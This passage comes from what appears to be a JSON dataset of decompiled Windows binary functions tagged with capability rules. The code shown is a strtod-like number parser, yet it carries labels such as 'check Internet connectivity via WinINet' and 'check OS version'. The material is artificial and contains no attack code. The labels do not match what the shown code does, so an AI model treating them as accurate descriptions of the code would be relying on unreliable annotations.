arg2[4],  uVar5 != 0)) {\n            *(arg1_00 + 0x14) = 0;\n            *in_stack_00000038 = 0x50;\n            uVar5 = 0;\n        }\n        else {\n            uVar1 = uVar10 - 1;\n            if ((0 < uVar1) && (uVar4 == 0)) {\n                uVar4 = fcn.14001dc40(arg1_00, uVar1);\n            }\n            uVar8 = uStack80;\n            if ((uVar4 | in_stack_00000028) == 0) goto code_r0x000140015d00;\n            uVar8 = *(arg1_00 + 0x18 + (uVar1 >> 5) * 4);\n            fcn.14001c7b0(arg1_00, uVar10);\n            *in_stack_00000038 = 2;\n            if ((uVar8 & 1 << (uVar1 & 0x1f)) == 0) {\n                uVar5 = 0x50;\n                if (uVar4 == 0) {\n                    uVar5 = uVar9;\n                }\n            }\n            else {\n                arg1_00 = fcn.140015b30(arg1_00);\n                uVar5 = 0x60;\n            }\n        }\n    }\n    else {\n        uVar8 = arg2[2];\n        uVar5 = uVar9;\n        if (uVar8 < auStack76[0]) {\n            *in_stack_00000038 = 0xa3;\n            auStack76[0] = uVar8 + 1;\n            puVar6 = sub.msvcrt.dll__errno();\n            *puVar6 = 0x22;\n            *(arg1_00 + 0x14) = 0;\n            uVar5 = 0;\n        }\n    }\n    *arg3 = auStack76[0];\n    fcn.14001dbd0(arg4, uVar3, arg1_00);\n    *in_stack_00000038 = *in_stack_00000038 | uVar5;\n    uVar8 = uStack80;\n    uVar5 = 1;\ncode_r0x000140015d00:\n    uStack80 = uVar8;\n    fcn.14001cfa0(arg1_00);\n    return uVar5;\n}\n",
        "token_count": 1759
    },
    "1400160f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.1400160f0(char *arg1, char **arg2, uint32_t *arg3, uint32_t *arg4)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    char **ppcVar9;\n    char *pcVar10;\n    int64_t iVar11;\n    int64_t arg1_00;\n    int64_t arg2_00;\n    int64_t arg1_01;\n    uint64_t uVar12;\n    ulong arg1_02;\n    uint64_t uVar13;\n    uint *puVar14;\n    uint32_t *puVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint64_t uVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    char cVar22;\n    char *pcVar23;\n    char *pcVar24;\n    uint64_t uVar25;\n    uint32_t uVar26;\n    uint32_t uVar27;\n    uint32_t uVar28;\n    double dVar29;\n    double dVar30;\n    double extraout_XMM0_Qa;\n    uint uVar31;\n    uint uVar32;\n    double dVar33;\n    uint uVar34;\n    uint uVar35;\n    uint uVar36;\n    uint uVar37;\n    uchar auVar38 [16];\n    uint64_t in_stack_00000028;\n    ulong uStack280;\n    uint32_t uStack264;\n    int32_t iStack260;\n    int32_t iStack252;\n    int32_t iStack248;\n    uint32_t uStack244;\n    uint32_t uStack208;\n    uint32_t uStack204;\n    uint32_t uStack188;\n    uchar auStack184 [4];\n    uint32_t uStack180;\n    uint32_t uStack176;\n    uint32_t uStack172;\n    char *pcStack168;\n    uint64_t auStack160 [12];\n    \n    ppcVar9 = sub.msvcrt.dll_localeconv();\n    pcVar24 = *ppcVar9;\n    sub.msvcrt.dll_strlen();\n    uStack180 = 0;\n    auStack160[0] = 0;\n    uVar1 = *arg3;\n    pcVar10 = arg1;\ncode_r0x000140016179:\n    cVar22 = *pcVar10;\n    // switch table (46 cases) at 0x14010f72c\n    switch(cVar22) {\n    case '\\0':\ncode_r0x00014001624b:\n        if (arg2 != NULL) {\n            *arg2 = arg1;\n        }\n        return 6;\n    default:\n        iStack252 = 0;\n        pcStack168 = pcVar10;\n        goto code_r0x0001400161b0;\n    case '\\t':\n    case '\\n':\n    case '\\v':\n    case '\\f':\n    case '\\r':\n    case ' ':\n        goto code_r0x0001400162a8;\n    case '+':\n        iStack252 = 0;\n        break;\n    case '-':\n        iStack252 = 1;\n    }\n    pcStack168 = pcVar10 + 1;\n    cVar22 = pcVar10[1];\n    if (cVar22 != '\\0') {\ncode_r0x0001400161b0:\n        uVar7 = 0;\n        if (cVar22 != '0') goto code_r0x0001400161bd;\n        if ((pcStack168[1] & 0xdfU) != 0x58) goto code_r0x0001400164f0;\n        uStack180 = fcn.14001bec0(&pcStack168, arg3, arg4, auStack160);\n        if (uStack180 != 6) goto code_r0x000140016528;\n        pcStack168 = arg1;\n        if (arg2 != NULL) {\n            *arg2 = arg1;\n        }\n        goto code_r0x000140016556;\n    }\n    goto code_r0x00014001624b;\ncode_r0x0001400162a8:\n    pcVar10 = pcVar10 + 1;\n    goto code_r0x000140016179;\ncode_r0x0001400164f0:\n    do {\n        pcStack168 = pcStack168 + 1;\n        cVar22 = *pcStack168;\n    } while (cVar22 == '0');\n    uVar7 = 1;\n    if (cVar22 == '\\0') goto code_r0x000140016528;\ncode_r0x0001400161bd:\n    pcVar10 = pcStack168;\n    uStack208 = arg3[4];\n    uVar5 = cVar22;\n    if (uVar5 - 0x30 < 10) {\n        uVar12 = 0;\n        uVar21 = 0;\n        uVar17 = 0;\n        do {\n            pcStack168 = pcStack168 + 1;\n            if (uVar17 < 9) {\n                uVar21 = (uVar5 - 0x30) + uVar21 * 10;\n            }\n            else if (uVar17 < 0x10) {\n                uVar12 = (uVar5 - 0x30) + uVar12 * 10;\n            }\n            cVar22 = *pcStack168;\n            uVar5 = cVar22;\n            uVar17 = uVar17 + 1;\n        } while (uVar5 - 0x30 < 10);\n    }\n    else {\n        uVar12 = 0;\n        uVar21 = 0;\n        uVar17 = 0;\n    }\n    if (*pcVar24 == cVar22) {\n        iVar11 = 1;\n        cVar22 = pcVar24[1];\n        while (cVar22 != '\\0') {\n            if (pcStack168[iVar11] != cVar22) goto code_r0x0001400162d1;\n            iVar11 = iVar11 + 1;\n            cVar22 = pcVar24[iVar11];\n        }\n        pcStack168 = pcStack168 + iVar11;\n        uVar5 = *pcStack168;\n        if (uVar17 == 0) {\n            pcVar24 = pcStack168;\n            if (uVar5 == 0x30) {\n                do {\n                    pcVar23 = pcVar24;\n                    pcVar24 = pcVar23 + 1;\n                    uVar5 = *pcVar24;\n                } while (uVar5 == 0x30);\n                uVar20 = (pcVar23 - pcStack168) + 1;\n                pcStack168 = pcVar24;\n            }\n            else {\n                uVar20 = 0;\n            }\n            pcVar24 = pcStack168;\n            if (uVar5 - 0x31 < 9) {\n                uVar28 = uVar5 - 0x30;\n                iStack260 = uVar20 + 1;\n                uVar25 = 1;\n                goto code_r0x000140016f20;\n            }\n            iStack260 = 0;\n            uVar25 = 0;\n        }\n        else {\n            iStack260 = 0;\n            uVar25 = uVar17;\n            uVar20 = 0;\n            pcVar24 = pcStack168;\n            pcStack168 = pcVar10;\n            while (uVar28 = uVar5 - 0x30,  pcVar10 = pcStack168,  uVar28 < 10) {\n                uVar5 = uVar25;\n                uVar20 = uVar20 + 1;\n                if (uVar28 != 0) {\n                    if (uVar20 == 1) {\n                        uVar16 = uVar5 + 1;\n                    }\n                    else {\n                        uVar16 = uVar20 + uVar5;\n                        do {\n                            uVar19 = uVar25;\n                            uVar5 = uVar19 + 1;\n                            uVar25 = uVar5;\n                            if (uVar19 < 9) {\n                                uVar21 = uVar21 * 10;\n                            }\n                            else if (uVar5 < 0x11) {\n                                uVar12 = uVar12 * 10;\n                            }\n                        } while (uVar16 - 1 != uVar5);\n                    }\n                    iStack260 = iStack260 + uVar20;\n                    if (uVar5 < 9) {\n                        uVar25 = uVar16;\ncode_r0x000140016f20:\n                        uVar20 = 0;\n                        uVar21 = uVar28 + uVar21 * 10;\n                    }\n                    else {\n                        uVar20 = 0;\n                        uVar25 = uVar16;\n                        if (uVar16 < 0x11) {\n                            uVar12 = uVar28 + uVar12 * 10;\n                        }\n                    }\n                }\n                uVar5 = pcVar24[1];\n                pcVar24 = pcVar24 + 1;\n            }\n        }\n        pcStack168 = pcVar24;\n        bVar3 = true;\n    }\n    else {\ncode_r0x0001400162d1:\n        iStack260 = 0;\n        uVar25 = uVar17;\n        uVar20 = 0;\n        bVar3 = false;\n    }\n    pcVar24 = pcStack168;\n    uVar28 = uVar25;\n    if ((uVar5 & 0xffffffdf) == 0x45) {\n        if ((uVar28 | uVar20 | uVar7) != 0) {\n            cVar22 = pcStack168[1];\n            if (cVar22 == '+') {\n                bVar4 = false;\ncode_r0x000140016dc0:\n                cVar22 = pcStack168[2];\n                pcStack168 = pcStack168 + 2;\n            }\n            else {\n                if (cVar22 == '-') {\n                    bVar4 = true;\n                    goto code_r0x000140016dc0;\n                }\n                bVar4 = false;\n                pcStack168 = pcStack168 + 1;\n            }\n            uVar5 = cVar22;\n            uVar16 = uVar5 - 0x30;\n            arg1 = pcVar24;\n            if (9 < uVar16) {\n                pcStack168 = pcVar24;\n                uVar16 = 0;\n                goto code_r0x0001400162f8;\n            }\n            if (uVar5 == 0x30) {\n                do {\n                    pcStack168 = pcStack168 + 1;\n                    uVar5 = *pcStack168;\n                } while (uVar5 == 0x30);\n                uVar16 = 0;\n                if (8 < uVar5 - 0x31) goto code_r0x0001400162f8;\n                uVar16 = uVar5 - 0x30;\n            }\n            uVar5 = pcStack168[1];\n            pcVar24 = pcStack168 + 1;\n            if (uVar5 - 0x30 < 10) {\n                pcVar23 = pcStack168 + 2;\n                do {\n                    pcVar24 = pcVar23;\n                    uVar16 = (uVar5 - 0x30) + uVar16 * 10;\n                    uVar5 = *pcVar24;\n                    pcVar23 = pcVar24 + 1;\n                } while (uVar5 - 0x30 < 10);\n                iVar11 = pcVar24 - pcStack168;\n                pcStack168 = pcVar24;\n                uVar19 = 19999;\n                if (iVar11 < 9) goto code_r0x0001400178a5;\n            }\n            else {\ncode_r0x0001400178a5:\n                pcStack168 = pcVar24;\n                uVar19 = 19999;\n                if (uVar16 < 20000) {\n                    uVar19 = uVar16;\n                }\n            }\n            uVar16 = -uVar19;\n            if (!bVar4) {\n                uVar16 = uVar19;\n            }\n            goto code_r0x0001400162f8;\n        }\n        goto code_r0x00014001658e;\n    }\n    pcStack168 = pcVar24;\n    uVar16 = 0;\ncode_r0x0001400162f8:\n    if (uVar28 == 0) {\n        if ((uVar20 | uVar7) != 0) goto code_r0x000140016528;\n        if (bVar3) goto code_r0x00014001658e;\n        if (uVar5 == 0x69) {\ncode_r0x000140016f73:\n            iVar6 = fcn.14001db80(&pcStack168, 0x14010f720);\n            if (iVar6 != 0) {\n                pcStack168 = pcStack168 + -1;\n                iVar6 = fcn.14001db80(&pcStack168, \"inity\");\n                if (iVar6 == 0) {\n                    pcStack168 = pcStack168 + 1;\n                }\n                uStack180 = 3;\ncode_r0x000140016fc2:\n                *arg4 = arg3[2] + 1;\n                goto code_r0x000140016528;\n            }\n        }\n        else if (uVar5 < 0x6a) {\n            if (uVar5 == 0x49) goto code_r0x000140016f73;\n            if (uVar5 == 0x4e) goto code_r0x000140016334;\n        }\n        else if (uVar5 == 0x6e) {\ncode_r0x000140016334:\n            iVar6 = fcn.14001db80(&pcStack168, 0x14010f729);\n            if (iVar6 != 0) {\n                uStack180 = 4;\n                *arg4 = arg3[2] + 1;\n                if (*pcStack168 != '(') goto code_r0x000140016528;\n                uStack180 = fcn.14001c990(&pcStack168, arg3, in_stack_00000028);\n                goto code_r0x000140016fc2;\n            }\n        }\ncode_r0x00014001658e:\n        uStack180 = 6;\n        pcStack168 = arg1;\n        goto code_r0x000140016528;\n    }\n    uStack180 = 1;\n    uVar7 = uVar16 - iStack260;\n    uVar5 = arg3[3] & 3;\n    uStack244 = uVar5 - iStack252;\n    uVar13 = uStack244;\n    if (uVar5 != 2) {\n        uStack244 = iStack252 + 1;\n        uVar13 = uStack244;\n        if (uVar5 != 3) {\n            uStack244 = uVar5 == 0;\n        }\n    }\n    dVar29 = uVar21;\n    uVar18 = uVar17;\n    if (uVar17 == 0) {\n        uVar18 = uVar25;\n    }\n    uVar5 = 0x10;\n    if (uVar28 < 0x11) {\n        uVar5 = uVar28;\n    }\n    if (9 < uVar28) {\n        dVar29 = dVar29 * *(*0x140110920 + (uVar5 - 9) * 8) + uVar12;\n        uVar13 = *0x140110920;\n    }\n    if ((uVar1 < 0x36) && (uVar28 < 0x10)) {\n        if (uVar7 == 0) {\n            iVar6 = fcn.140015bf0(uVar13, arg3, arg4, in_stack_00000028);\njoined_r0x000140017868:\n            if (iVar6 != 0) goto code_r0x000140016528;\n            uVar17 = uVar28 - uVar5;\n            uVar20 = uVar17;\n            if (0 < uVar17) goto code_r0x000140016723;\ncode_r0x000140016d88:\n            if (uVar17 == 0) goto code_r0x00014001674a;\n        }\n        else {\n            if (0 < uVar7) {\n                if (uVar7 < 0x17) {\n                    uVar17 = SUB84(dVar29, 0);\n                    if (uVar17 == 0) {\n                        iVar6 = 0;\n                        for (uVar17 = dVar29 >> 0x20 | 0x100000; (uVar17 & 1) == 0; uVar17 = uVar17 >> 1 | 0x80000000) {\n                            iVar6 = iVar6 + 1;\n                        }\n                        uVar17 = 0x15 - iVar6;\n                    }\n                    else {\n                        iVar6 = 0;\n                        for (; (uVar17 & 1) == 0; uVar17 = uVar17 >> 1 | 0x80000000) {\n                            iVar6 = iVar6 + 1;\n                        }\n                        uVar17 = 0x35 - iVar6;\n                    }\n                    uVar13 = uVar17;\n                    dVar29 = dVar29 * *(*0x140110920 + uVar7 * 8);\n                }\n                else {\n                    if (0x25 - uVar28 < uVar7) {\n                        uVar17 = (uVar28 - uVar5) + uVar7;\n                        goto code_r0x000140016d72;\n                    }\n                    uVar17 = uVar7 - (0xf - uVar28);\n                    uVar13 = uVar17;\n                    dVar29 = dVar29 * *(*0x140110920 + (0xf - uVar28) * 8) * *(*0x140110920 + uVar17 * 8);\n                }\ncode_r0x0001400166ec:\n                iVar6 = fcn.140015bf0(uVar13, arg3, arg4, in_stack_00000028);\n                goto joined_r0x000140017868;\n            }\n            uVar17 = (uVar28 - uVar5) + uVar7;\n            if (-0x17 < uVar7) {\n                dVar29 = dVar29 / *(*0x140110920 + (iStack260 - uVar16) * 8);\n                goto code_r0x0001400166ec;\n            }\n        }\n        uVar5 = -uVar17;\n        if ((uVar5 & 0xf) != 0) {\n            dVar29 = dVar29 / *(*0x140110920 + (uVar5 & 0xf) * 8);\n        }\n        uVar17 = uVar5 & 0xfffffff0;\n        if (uVar17 != 0) {\n            uVar5 = uVar5 >> 4;\n            if (uVar17 < 0x100) {\n                iVar6 = 0;\n            }\n            else {\n                iVar6 = 0;\n                uVar17 = uVar5;\n                do {\n                    uVar17 = uVar17 - 0x10;\n                    uVar20 = dVar29 >> 0x20;\n                    iVar6 = iVar6 + -0x3ff + (uVar20 >> 0x14 & 0x7ff);\n                    dVar29 = (dVar29 & 0xffffffff | (uVar20 & 0x800fffff | 0x3ff00000) << 0x20) * *(*0x140110930 + 0x20)\n                    ;\n                } while (0xf < uVar17);\n                uVar5 = uVar5 & 0xf;\n            }\n            uVar17 = iVar6 + -0x3ff + (dVar29 >> 0x34 & 0x7ff);\n            uVar13 = dVar29 & 0xffffffff;\n            if (uVar5 != 0) {\n                uVar13 = 0;\n                do {\n                    if ((uVar5 & 1) != 0) {\n                        uVar13 = 1;\n                    }\n                    uVar5 = uVar5 >> 1;\n                } while (uVar5 != 0);\n            }\n        }\n    }\n    else {\n        uVar17 = (uVar28 - uVar5) + uVar7;\n        if (uVar17 < 1) goto code_r0x000140016d88;\ncode_r0x000140016d72:\n        uVar20 = uVar17 & 0xf;\n        uVar5 = uVar17;\n        if (uVar20 != 0) {\ncode_r0x000140016723:\n            dVar29 = dVar29 * *(*0x140110920 + uVar20 * 8);\n            uVar5 = uVar17;\n        }\n        uVar17 = uVar5 & 0xfffffff0;\n        if (uVar17 != 0) {\n            uVar5 = uVar5 >> 4;\n            if (uVar17 < 0x100) {\n                iVar6 = 0;\n            }\n            else {\n                iVar6 = 0;\n                uVar17 = uVar5;\n                do {\n                    uVar17 = uVar17 - 0x10;\n                    uVar20 = dVar29 >> 0x20;\n                    iVar6 = iVar6 + -0x3ff + (uVar20 >> 0x14 & 0x7ff);\n                    dVar29 = (dVar29 & 0xffffffff | (uVar20 & 0x800fffff | 0x3ff00000) << 0x20) * *(*0x140110830 + 0x20)\n                    ;\n                } while (0xf < uVar17);\n                uVar5 = uVar5 & 0xf;\n            }\n            uVar17 = dVar29 >> 0x34 & 0x7ff;\n            uVar13 = uVar17;\n            uVar17 = iVar6 + -0x3ff + uVar17;\n            if (uVar5 != 0) {\n                uVar13 = 0;\n                do {\n                    if ((uVar5 & 1) != 0) {\n                        uVar13 = 1;\n                    }\n                    uVar5 = uVar5 >> 1;\n                } while (uVar5 != 0);\n            }\n        }\n    }\ncode_r0x00014001674a:\n    auStack160[0] = fcn.14001d8c0(uVar13, &uStack172, &uStack176);\n    uStack172 = uVar17 + uStack172;\n    uVar5 = uStack176 - uVar1;\n    if (0 < uVar5) {\n        fcn.14001c7b0(auStack160[0], uVar5);\n        uStack172 = uStack172 + uVar5;\n        uStack176 = uVar1;\n    }\n    uStack204 = (uStack172 + uStack176) - uVar1;\n    if (arg3[2] + 1 < uStack204) {\n        uStack264 = 0;\n        goto code_r0x000140017728;\n    }\n    uVar5 = arg3[1];\n    if (uVar5 <= uStack204) {\n        uStack264 = 0;\n        goto code_r0x00014001687a;\n    }\n    uVar17 = uStack172 - uVar5;\n    if (0 < uVar17) {\n        auStack160[0] = fcn.14001d470(auStack160[0], uVar17);\n        uStack176 = uStack176 + uVar17;\ncode_r0x000140016840:\n        if (uStack208 == 0) {\n            uStack264 = 1;\n            uStack204 = uVar5;\n            uStack172 = uVar5;\ncode_r0x00014001687a:\n            iVar11 = fcn.14001d9f0(pcVar10, uVar18, uVar25, uVar21);\n            uVar34 = SUB84(*0x14010f860, 0);\n            uVar35 = *0x14010f860 >> 0x20;\n            uVar36 = *0x14010f868;\n            uVar37 = *0x14010f868 >> 0x20;\n            auVar38 = ZEXT816(*0x14010f890);\n            uVar21 = 0;\n            if (uVar7 < 0) {\n                uVar21 = iStack260 - uVar16;\n            }\n            uVar17 = 0;\n            if (uVar7 >= 0) {\n                uVar17 = uVar7;\n            }\n            uVar20 = 0;\n            do {\n                arg1_00 = fcn.14001ceb0(*(iVar11 + 8));\n                sub.msvcrt.dll_memcpy(arg1_00 + 0x10, iVar11 + 0x10, *(iVar11 + 0x14) * 4 + 8);\n                arg2_00 = fcn.14001ceb0(*(auStack160[0] + 8));\n                sub.msvcrt.dll_memcpy(arg2_00 + 0x10);\n                uVar16 = uStack172;\n                uVar28 = uStack176;\n                uStack280 = fcn.14001d0d0(1);\n                iVar6 = uVar16 + uVar20;\n                uVar19 = uVar28 - uVar20;\n                if (iVar6 < 0) {\n                    uVar27 = uVar17 - iVar6;\n                    uVar26 = uVar21;\n                }\n                else {\n                    uVar27 = uVar17;\n                    uVar26 = iVar6 + uVar21;\n                }\n                iVar8 = (uVar28 + uVar16) - uVar1;\n                iVar6 = (uVar1 + 1) - uVar19;\n                if (iVar8 < uVar5) {\n                    iVar6 = (iVar8 - uVar5) + iVar6;\n                }\n                uVar28 = uVar26 + iVar6;\n                uVar27 = uVar27 + iVar6;\n                uVar16 = uVar27;\n                if (uVar28 <= uVar27) {\n                    uVar16 = uVar28;\n                }\n                if (uVar26 < uVar16) {\n                    uVar16 = uVar26;\n                }\n                if (0 < uVar16) {\n                    uVar28 = uVar28 - uVar16;\n                    uVar27 = uVar27 - uVar16;\n                    uVar26 = uVar26 - uVar16;\n                }\n                arg1_01 = arg2_00;\n                if (0 < uVar21) {\n                    uStack280 = fcn.14001d2f0(uStack280, uVar21);\n                    arg1_01 = fcn.14001d190(uStack280, arg2_00);\n                    fcn.14001cfa0(arg2_00);\n                }\n                uVar16 = uVar28 - uVar20;\n                if (uVar16 < 1) {\n                    if (uVar16 != 0) {\n                        fcn.14001c7b0(arg1_01, uVar20 - uVar28);\n                    }\n                }\n                else {\n                    arg1_01 = fcn.14001d470(arg1_01, uVar16);\n                }\n                if (0 < uVar7) {\n                    arg1_00 = fcn.14001d2f0(arg1_00, uVar17);\n                }\n                if (0 < uVar27) {\n                    arg1_00 = fcn.14001d470(arg1_00, uVar27);\n                }\n                if (0 < uVar26) {\n                    uStack280 = fcn.14001d470(uStack280, uVar26);\n                }\n                uVar12 = fcn.14001d5d0(arg1_01, arg1_00);\n                uVar28 = uStack208;\n                if ((*(uVar12 + 0x14) < 2) && (*(uVar12 + 0x18) == 0)) goto code_r0x000140017380;\n                uVar16 = *(uVar12 + 0x10);\n                *(uVar12 + 0x10) = 0;\n                uVar25 = uVar12;\n                iVar6 = fcn.14001d580(uVar12, uStack280);\n                if ((uStack244 == 0) || (0 < iVar6)) {\n                    if (iVar6 < 0) {\n                        if (uVar16 == 0) {\n                            uStack180 = 0x21;\n                            if (((1 < uVar19) || (uStack204 == uVar5)) || (uStack264 != 0)) goto code_r0x000140017380;\n                            uVar12 = fcn.14001d470(uVar12, 1);\n                            iVar6 = fcn.14001d580(uVar12, uStack280);\n                            uVar27 = uStack176;\n                            if (iVar6 < 1) goto code_r0x000140017601;\n                            uStack180 = 0x11;\n                            uStack264 = 0;\ncode_r0x000140017946:\n                            uStack172 = uStack172 - uVar1;\ncode_r0x0001400176fe:\n                            uStack176 = uVar1;\n                            auStack160[0] = fcn.140015ff0(auStack160[0], uVar1);\n                        }\n                        else {\ncode_r0x000140017ba0:\n                            uStack180 = 0x11;\n                        }\n                        goto code_r0x000140017380;\n                    }\n                    if (iVar6 == 0) {\n                        if (uVar16 == 0) {\n                            uStack180 = 0x21;\n                            if (uVar19 == 1) {\n                                uStack180 = 1;\n                                if (uStack204 != uVar5) goto code_r0x000140017946;\n                                uStack180 = 0x21;\n                                if ((*(auStack160[0] + 0x14) == 1) && (uVar28 = uVar19,  *(auStack160[0] + 0x18) != 1))\n                                {\n                                    uVar28 = uStack208;\n                                }\n                                goto code_r0x000140017380;\n                            }\n                        }\n                        else {\n                            if (uStack264 != 0) {\n                                puVar15 = auStack160[0] + 0x18;\n                                goto code_r0x0001400179ea;\n                            }\n                            uStack180 = 0x11;\n                        }\n                        if ((uVar19 < uVar1) && (uVar27 = uStack176,  uStack264 == 0)) goto code_r0x000140017601;\n                        if ((*(auStack160[0] + 0x18) & 1) == 0) goto code_r0x000140017380;\n                        if (uVar16 != 0) goto code_r0x000140017cad;\n                        if (uVar19 != 1) {\n                            fcn.140015fc0(auStack160[0]);\n                            goto code_r0x000140017ba0;\n                        }\ncode_r0x000140017abd:\n                        *(auStack160[0] + 0x14) = 0;\n                        uStack180 = 0x50;\n                        uStack172 = uVar5;\n                        goto code_r0x000140017380;\n                    }\n                    uVar25 = uVar12;\n                    fcn.14001dae0(uVar12, uStack280);\n                    if (CONCAT44(uVar37, uVar36) < extraout_XMM0_Qa) {\n                        dVar29 = extraout_XMM0_Qa * *0x14010f870;\n                        uVar31 = SUB84(dVar29, 0);\n                        uVar32 = dVar29 >> 0x20;\n                        uVar19 = (-(uVar16 == 0) & 0x10) + 0x10;\n                        uVar16 = uVar16 == 0;\n                        if (*0x14010f878 <= dVar29) {\n                            iStack248 = 0;\n                            uVar20 = 0;\n                        }\n                        else {\n                            iStack248 = dVar29;\n                            dVar33 = iStack248;\n                            dVar30 = dVar29 - dVar33;\n                            uVar31 = SUB84(dVar30, 0);\n                            uVar32 = dVar30 >> 0x20;\n                            dVar29 = dVar33;\n                            if (uStack244 == 1) {\n                                if (uVar16 != 0) {\ncode_r0x000140017305:\n                                    if (0.0 < dVar30) goto code_r0x00014001730f;\n                                }\ncode_r0x0001400172f4:\n                                uVar20 = 0;\n                            }\n                            else if (uStack244 == 2) {\n                                if (uVar16 == 0) goto code_r0x000140017305;\n                                uVar20 = 0;\n                            }\n                            else {\n                                if (dVar30 < *0x14010f870) goto code_r0x0001400172f4;\ncode_r0x00014001730f:\n                                iStack248 = iStack248 + 1;\n                                uVar19 = 0x30 - uVar19;\n                                uVar20 = 0;\n                                dVar29 = iStack248;\n                            }\n                        }\n                    }\n                    else {\n                        if (uVar16 == 0) {\n                            uVar20 = 0;\n                            uVar31 = uVar34;\n                            uVar32 = uVar35;\n                            goto code_r0x000140016b2d;\n                        }\n                        iStack248 = 0;\n                        uVar20 = 0;\n                        uVar16 = 0;\n                        uVar19 = 0x20;\n                        uVar31 = SUB84(*0x14010f860, 0);\n                        uVar32 = *0x14010f860 >> 0x20;\n                        dVar29 = *0x14010f860;\n                    }\n                }\n                else {\n                    uVar27 = uStack244 & 1;\n                    uVar20 = uVar27 ^ uVar16;\n                    if (uVar27 == uVar16) {\n                        uStack180 = (-(uVar27 == 0) & 0x10) + 0x11;\n                        goto code_r0x000140017380;\n                    }\n                    if (uVar16 != 0) {\n                        uVar19 = 0x20;\n                        uVar16 = 0;\n                        uStack180 = 0x21;\n                        iStack248 = 0;\n                        uVar31 = SUB84(*0x14010f860, 0);\n                        uVar32 = *0x14010f860 >> 0x20;\n                        dVar29 = *0x14010f860;\n                        goto code_r0x000140016b5b;\n                    }\n                    uStack180 = 0x11;\n                    uVar31 = uVar34;\n                    uVar32 = uVar35;\n                    if (uStack204 != uVar5) {\n                        uVar27 = uVar1;\n                        if (0x1f < uVar1) {\n                            uVar13 = 1;\n                            do {\n                                uVar18 = uVar13;\n                                if (*(auStack160[0] + 0x14 + uVar18 * 4) != 0) goto code_r0x000140016b2d;\n                                uVar27 = uVar27 - 0x20;\n                                uVar25 = uVar18 + 1;\n                                uVar13 = uVar25;\n                            } while (0x1f < uVar27);\n                            uVar16 = uVar18;\n                        }\n                        if (1 < uVar27) {\n                            puVar15 = auStack160[0] + 0x18 + uVar16 * 4;\n                            uVar26 = 0;\n                            uVar16 = *puVar15;\n                            for (uVar2 = uVar16; (uVar2 & 1) == 0; uVar2 = uVar2 >> 1 | 0x80000000) {\n                                uVar26 = uVar26 + 1;\n                            }\n                            uVar25 = uVar26;\n                            *puVar15 = uVar16 >> (uVar26 & 0x1f);\n                            if (uVar26 < uVar27 - 1) goto code_r0x000140016b2d;\n                        }\n                        uStack172 = uStack204 - 1;\n                        goto code_r0x0001400176fe;\n                    }\ncode_r0x000140016b2d:\n                    if ((uVar19 < 2) && (uStack264 != 0)) {\n                        uStack264 = 1;\n                        goto code_r0x000140017abd;\n                    }\n                    iStack248 = 0;\n                    uVar19 = 0x10;\n                    uVar16 = 1;\n                    uVar34 = uVar31;\n                    uVar35 = uVar32;\n                    dVar29 = CONCAT44(uVar32, uVar31);\n                }\ncode_r0x000140016b5b:\n                iVar6 = uStack172 + uStack176;\n                if ((uStack264 == 0) && (uStack176 < uVar1)) {\n                    uVar27 = uVar1 - uStack176;\n                    uVar13 = fcn.14001d470(auStack160[0], uVar27);\n                    uStack172 = uStack172 - uVar27;\n                    uVar25 = auStack160[0];\n                    uStack176 = uVar1;\n                    auStack160[0] = uVar13;\n                }\n                arg1_02 = fcn.14001d8c0(uVar25, &uStack188, auStack184);\n                if (uStack188 < 0) {\n                    fcn.14001c7b0(arg1_02, -uStack188);\n                }\n                else if (uStack188 != 0) {\n                    arg1_02 = fcn.14001d470(arg1_02, uStack188);\n                }\n                uVar25 = auStack160[0];\n                if (uVar16 == 0) {\n                    auStack160[0] = fcn.140017d10(auStack160[0], arg1_02);\n                    iVar8 = *(auStack160[0] + 0x14) + -1;\n                    if (*(uVar25 + 0x14) != iVar8 && iVar8 <= *(uVar25 + 0x14)) {\n                        puVar15 = auStack160[0] + 8 + (iVar8 + 4) * 4;\n                        uVar16 = 0x1f;\n                        if (*puVar15 != 0) {\n                            for (; *puVar15 >> uVar16 == 0; uVar16 = uVar16 - 1) {\n                            }\n                        }\n                        puVar15 = uVar25 + 8 + (iVar8 + 4) * 4;\n                        uVar27 = 0x1f;\n                        if (*puVar15 != 0) {\n                            for (; *puVar15 >> uVar27 == 0; uVar27 = uVar27 - 1) {\n                            }\n                        }\n                        if ((uVar27 ^ 0x1f) <= (uVar16 ^ 0x1f)) goto code_r0x000140016c30;\n                    }\n                    if (uStack264 != 0) {\n                        uStack176 = uStack176 + 1;\n                        uStack264 = uStack176 != uVar1;\n                        goto code_r0x000140016c30;\n                    }\n                    fcn.14001c7b0(auStack160[0], 1);\n                    uStack172 = uStack172 + 1;\n                    uStack204 = uStack204 + 1;\n                    fcn.14001cfa0(arg1_02);\n                    fcn.14001cfa0(uVar25);\n                    uVar27 = uStack176;\n                    if (uVar20 != 0) goto code_r0x000140017601;\ncode_r0x00014001725a:\n                    uVar20 = fcn.14001c8b0(auStack160[0]);\n                    uStack264 = 0;\n                }\n                else {\n                    auStack160[0] = fcn.14001d5d0(auStack160[0], arg1_02);\n                    if (uStack264 == 0) {\n                        iVar8 = *(uVar25 + 0x14) + -1;\n                        if (*(auStack160[0] + 0x14) != iVar8 && iVar8 <= *(auStack160[0] + 0x14)) {\n                            puVar15 = auStack160[0] + 8 + (iVar8 + 4) * 4;\n                            uVar27 = 0x1f;\n                            if (*puVar15 != 0) {\n                                for (; *puVar15 >> uVar27 == 0; uVar27 = uVar27 - 1) {\n                                }\n                            }\n                            puVar15 = uVar25 + 8 + (iVar8 + 4) * 4;\n                            uVar26 = 0x1f;\n                            if (*puVar15 != 0) {\n                                for (; *puVar15 >> uVar26 == 0; uVar26 = uVar26 - 1) {\n                                }\n                            }\n                            if ((uVar27 ^ 0x1f) <= (uVar26 ^ 0x1f)) goto code_r0x000140016c30;\n                        }\n                        if (uStack204 != uVar5) {\n                            auStack160[0] = fcn.14001d470(auStack160[0], 1);\n                            uStack172 = uStack172 - 